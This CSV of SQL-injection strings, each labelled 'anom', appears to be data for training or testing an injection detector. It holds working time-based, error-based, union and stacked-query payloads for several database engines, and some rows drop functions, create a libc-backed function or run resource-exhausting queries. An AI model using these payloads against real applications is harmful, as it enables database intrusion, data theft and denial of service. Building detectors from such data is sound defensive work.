payload,label
1'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,anom
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('fnon' like 'fnon",anom
"-1031%"" union all select 6832,6832,6832,6832#",anom
"1%"")) and make_set(9897=5557,5557) and ((""%""=""",anom
"1) union all select null,null,null,null,null,null,null,null,null--",anom
"1) as selm where 5759=5759;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-5524) as eoyk where 6928=6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",anom
1'+(select enzd where 6046=6046 and (3020=3020)*6703)+',anom
"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",anom
"1)) as rbae where 2049=2049 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
"1')) as hmyc where 6732=6732 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",anom
1'+(select 'dkxk' where 1241=1241 waitfor delay '0:0:5'--,anom
1'));begin dbms_lock.sleep(5); end and (('vkle'='vkle,anom
"-7579%"" or 6570=1764",anom
1'||(select 'feyg' from dual where 7734=7734 and 3843=6724#,anom
"1"")) or sleep(5) and ((""mtmb"" like ""mtmb",anom
"1""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""yopd"" like ""yopd",anom
"1')) as vrwr where 3830=3830;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
-2039') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),anom
"1%"")));select (case when (4996=1734) then 1 else 4996*(select 4996 from master..sysdatabases) end)--",anom
1')) as qgyz where 1547=1547 and 8594=(select 8594 from pg_sleep(5))--,anom
"1' where 6963=6963 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",anom
1'));select (case when (3365=6236) then 3365 else 1/(select 0) end)--,anom
"1"") as mibc where 3113=3113;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",anom
1')) waitfor delay '0:0:5' and (('amnf' like 'amnf,anom
"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",anom
"1' where 7504=7504 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",anom
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('zaru'='zaru",anom
"1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",anom
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",anom
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),anom
"1%"" or (select * from (select(sleep(5)))sddo)#",anom
1) as bpap where 7758=7758 or 4240=(select 4240 from pg_sleep(5))--,anom
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('dzzx'='dzzx",anom
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",anom
1'+(select soqk where 5383=5383;select pg_sleep(5)--,anom
"1%"") and make_set(8403=8403,8899) and (""%""=""",anom
1'));select pg_sleep(5)--,anom
"1%') union all select null,null,null,null#",anom
"1"")) as xcyo where 2929=2929;select sleep(5)--",anom
-9564 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),anom
"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (4959=4959",anom
1'+(select 'ohdf' where 7878=7878 and 5678=3277--,anom
"1;select count(*) from generate_series(1,5000000)# fnck",anom
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),anom
1))) and 6467=1864#,anom
"1%"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",anom
"1"") as nqtn where 5606=5606 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
1%')) order by 1--,anom
"1' where 8803=8803 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1"") as ffon where 2738=2738 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",anom
"1') as mara where 7164=7164;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
"1' where 7125=7125 or elt(6272=6272,sleep(5))--",anom
"1')) and elt(4249=4249,7259) and (('miir' like 'miir",anom
"1 where 1062=1062 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1"") union all select null,null,null,null,null,null,null#",anom
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""ijop""=""ijop",anom
1));(select * from (select(sleep(5)))srmq) and ((4982=4982,anom
"-2241))) or make_set(9354=9354,7185) and (((6840=6840",anom
"1' where 4417=4417 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",anom
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""njdu"" like ""njdu",anom
1)));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,anom
-7345) union all select 3866#,anom
"-4287%"")) union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",anom
"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",anom
"-3037""))) or elt(4758=9129,9129) and (((""zewv"" like ""zewv",anom
1'+(select bjav where 6923=6923 and (select * from (select(sleep(5)))gcrr)#,anom
"1%"" and (select * from (select(sleep(5)))fzno) and ""%""=""",anom
"-6381%"" or 8571=8571--",anom
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('beju' like 'beju",anom
1';begin user_lock.sleep(5); end,anom
1%') and sleep(5)#,anom
-8521'+(select ucim where 9003=9003 union all select 9003--,anom
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dqis""=""dqis",anom
-5147 or (8459=8459)*4906,anom
"1"")) as gvpm where 5170=5170 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
-8378%') union all select 5491#,anom
"-9718%"") union all select 9515,9515,9515#",anom
1))) and 4595=4595#,anom
"1%"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",anom
"1))) union all select null,null,null,null,null,null,null,null#",anom
"-6263"" union all select 8005,8005#",anom
"1' in boolean mode);iif(5257=5257,1,1/0)",anom
1;(select * from (select(sleep(5)))srmq),anom
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)-- hlgt",anom
"-6041')) or make_set(9835=1367,1367) and (('hxjf'='hxjf",anom
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('dbsm'='dbsm",anom
"1'+(select 'idmr' where 5029=5029 union all select null,null,null,null,null,null--",anom
"1'+(select taga where 8036=8036;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
"1' in boolean mode) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",anom
"1""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""xtyt""=""xtyt",anom
"1"")) as ndbk where 5042=5042 and 8594=(select 8594 from pg_sleep(5))--",anom
1')));if(9431=6730) select 9431 else drop function xbkh--,anom
1'||(select 'idna' from dual where 2683=2683 rlike (select (case when (3201=9748) then 1 else 0x28 end)))||',anom
"-1050"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""orfo"" like ""orfo",anom
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('ylql' like 'ylql",anom
1'||(select 'oxas' from dual where 8284=8284 or sleep(5))||',anom
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('owot'='owot",anom
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""ikaf"" like ""ikaf",anom
1%' or 6793=(select 6793 from pg_sleep(5)) and '%'=',anom
"1))) union all select null,null--",anom
"1%"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",anom
"1"");begin dbms_lock.sleep(5); end--",anom
"-7371') union all select 4531,4531,4531#",anom
1' and 8594=(select 8594 from pg_sleep(5))--,anom
"1"")) as sqow where 8752=8752;select (case when (1726=4080) then 1726 else 1/(select 0) end)--",anom
"1'||(select 'brsr' where 5458=5458;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",anom
1')) as hpta where 5376=5376 waitfor delay '0:0:5'--,anom
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gucd'='gucd",anom
"-1993%"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",anom
1%';select (case when (1407=2741) then 1407 else 1407*(select 1407 from mysql.db) end)#,anom
"1%"")) or sleep(5) and ((""%""=""",anom
"1) where 9010=9010 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pziy'='pziy,anom
"-7409"")) union all select 3145,3145,3145--",anom
-8301'))) or (5708=5268)*5268 and ((('hkha'='hkha,anom
"1) as odqn where 3910=3910;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",anom
-6757'))) or 4524=3696,anom
1)));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,anom
"1%"")) and 7533=7533 and ((""%""=""",anom
"1"" waitfor delay '0:0:5'",anom
"1 or 8466=benchmark(5000000,md5(0x694a4745))# irvm",anom
1)) as mlpf where 7425=7425;select sleep(5)--,anom
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('afdy' like 'afdy",anom
"1)) or 8421=(select count(*) from generate_series(1,5000000)) and ((4277=4277",anom
"1'))) and elt(9041=6421,6421) and ((('ixxg' like 'ixxg",anom
"1) where 2720=2720 and elt(4249=4249,7259)--",anom
"1%')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('%'='",anom
"1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",anom
"1"";if(8812=7896) select 8812 else drop function xltk--",anom
-9225) or (8258=2726)*2726 and (9900=9900,anom
"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""urqg""=""urqg",anom
"1""));(select * from (select(sleep(5)))acdk)#",anom
"1' in boolean mode) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)#",anom
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cgiu'='cgiu,anom
"-2225' union all select 1545,1545,1545,1545#",anom
1%')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'=',anom
"1%' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",anom
"1%"")) and 7358=6986--",anom
"1"") where 2136=2136 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
-7452 where 2224=2224 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,anom
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",anom
1' where 8469=8469;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,anom
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('esal'='esal,anom
"1%' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1)) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",anom
1)) as xcsm where 9231=9231;select sleep(5)#,anom
"1"") as kuuf where 6908=6908;if(7899=7899) select 7899 else drop function zbbp--",anom
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",anom
1') or (select * from (select(sleep(5)))ydpu),anom
1');begin user_lock.sleep(5); end,anom
"-9208%"")) or 8571=8571--",anom
"1'||(select 'yzdz' where 5021=5021;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",anom
"1) as kaew where 2658=2658;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",anom
1;select (case when (5796=8326) then 5796 else 5796*(select 5796 from information_schema.character_sets) end)#,anom
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ksxz""=""ksxz",anom
"1"" and 7533=7533 and ""dqjp""=""dqjp",anom
"1)) as queb where 2449=2449 union all select null,null#",anom
-5585' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),anom
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",anom
"1""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1%"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",anom
"1)) as jrzr where 5194=5194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1%"");select case when 9390=5752 then 1 else null end--",anom
"1) where 7485=7485 and make_set(8403=8403,8899)--",anom
1) as sglv where 7676=7676;begin dbms_lock.sleep(5); end--,anom
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# sipo,anom
"1%"" and 2388=benchmark(5000000,md5(0x6d457153))#",anom
"1) where 5615=5615 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",anom
"1'+(select pxsd where 2576=2576 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",anom
"1""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",anom
1)));select pg_sleep(5) and (((9476=9476,anom
"-7125"" or (8919=2275)*2275 and ""fbwo""=""fbwo",anom
"1');select * from generate_series(7494,7494,case when (7494=7854) then 1 else 0 end) limit 1--",anom
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('kqqf'='kqqf",anom
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""vlev"" like ""vlev",anom
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""sckh""=""sckh",anom
"-4015"" where 2610=2610 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""vabm""=""vabm",anom
"1%"") union all select null,null,null,null,null,null,null,null,null,null--",anom
"-9507%"" union all select 3342,3342,3342,3342,3342#",anom
"1"") as jaxh where 6318=6318 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",anom
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('swua' like 'swua",anom
"1' in boolean mode) or elt(6272=6272,sleep(5))#",anom
"-1287"") as bbzg where 1475=1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",anom
"1%"") or elt(6272=6272,sleep(5)) and (""%""=""",anom
"1%'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",anom
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('nbsf' like 'nbsf",anom
-3422%') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',anom
"1%'))) union all select null,null,null,null,null,null,null,null#",anom
1'+(select yjyp where 9696=9696;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,anom
1'||(select 'tvcy' where 5592=5592 order by 1#,anom
"1) and 2388=benchmark(5000000,md5(0x6d457153))#",anom
"1')) union all select null,null,null,null,null,null,null,null,null--",anom
"1'||(select 'cfff' where 4994=4994;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",anom
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('uqfs'='uqfs,anom
"1"") where 2602=2602 and 8407=(select count(*) from generate_series(1,5000000))--",anom
"1%"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""%""=""",anom
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('dcys' like 'dcys",anom
"1') where 2725=2725 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
"1'+(select 'uzaw' where 9900=9900 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",anom
"-8588' union all select 2135,2135--",anom
"-5840') or elt(1032=1032,3623)",anom
1';select (case when (7990=7627) then 7990 else 1/(select 0) end)--,anom
"1"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",anom
"-1956"") where 1448=1448 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",anom
"1) and 8407=(select count(*) from generate_series(1,5000000))",anom
"1%"" and elt(5345=8751,8751) and ""%""=""",anom
1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,anom
"1))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"1'||(select 'dbxr' where 4014=4014 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",anom
"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",anom
"1)) as rpwt where 4103=4103 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
"1""))) and sleep(5)#",anom
"1,(select (case when (5726=5275) then 1 else 1/(select 0) end))",anom
"1"" and 7533=7533 and ""btak"" like ""btak",anom
1')) as dago where 9788=9788;select (case when (6652=1932) then 6652 else 6652*(select 6652 from information_schema.character_sets) end)#,anom
"1'||(select 'scwx' where 6591=6591 and 3824=benchmark(5000000,md5(0x76555642)))||'",anom
1') and (1414=4775)*4775 and ('mlmw'='mlmw,anom
-7548 or 2850=9666,anom
1'));waitfor delay '0:0:5' and (('uvlf'='uvlf,anom
"1"") union all select null#",anom
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('vjdk' like 'vjdk",anom
-5615') where 5931=5931 or 8450=9229,anom
1' and 4374=2305,anom
1) as iqkf where 7780=7780;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,anom
"1') where 5871=5871;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
"1') where 9226=9226 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"1) as ihan where 5298=5298 and elt(6587=3479,3479)--",anom
1')) and 7533=7533 and (('gvoh'='gvoh,anom
1') rlike sleep(5),anom
1;select (case when (2768=8868) then 2768 else cast(1 as int)/(select 0 from dual) end) from dual--,anom
"-4964"")) union all select 4750,4750,4750,4750,4750--",anom
1')) as yqcl where 5026=5026 rlike (select * from (select(sleep(5)))sgvo)--,anom
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'drui' like 'drui",anom
"1"") as pwvu where 8267=8267;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",anom
"1) union all select null,null,null,null,null,null,null,null,null#",anom
1'));select (case when (7385=8723) then 7385 else 7385*(select 7385 from information_schema.character_sets) end)#,anom
"-2382%') union all select 8885,8885,8885,8885,8885,8885,8885#",anom
"1%""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""%""=""",anom
-4768'||(select 'dded' from dual where 6499=6499 union all select 6499--,anom
1')) and 9198=9198--,anom
"-2857%'))) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",anom
"(updatexml(8862,concat(0x2e,0x7171706a71,(select (elt(8862=8862,1))),0x717a767a71),8981))",anom
"1%"") union all select null,null,null,null,null,null,null#",anom
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('pwpc'='pwpc",anom
"1%""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""%""=""",anom
"1 and make_set(9681=4703,4703)# zbrf",anom
"1"" where 9332=9332 union all select null,null,null,null,null,null,null,null,null--",anom
"1"") union all select null,null,null,null,null,null#",anom
"-5013'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('ehwh' like 'ehwh",anom
"1'+(select bruk where 1400=1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'",anom
"1"" where 6352=6352;begin dbms_lock.sleep(5); end--",anom
"1' where 6409=6409;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
"1') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('mymg'='mymg",anom
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""=""",anom
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('boud'='boud",anom
"-3862')) union all select 2495,2495,2495,2495,2495,2495,2495--",anom
"1)) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((8294=8294",anom
1)));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,anom
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""jfgk"" like ""jfgk",anom
-9202' where 9799=9799 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,anom
"1') or elt(6272=6272,sleep(5)) and ('xwsb'='xwsb",anom
"1) as jqbv where 8172=8172 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
"1) as estm where 4809=4809 union all select null,null,null--",anom
"1' in boolean mode) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",anom
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq",anom
"-2048)) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",anom
-8409)) as ipbz where 9984=9984 or 3371=3869,anom
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('gxgi'='gxgi",anom
"1"");waitfor delay '0:0:5' and (""ludp"" like ""ludp",anom
"1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",anom
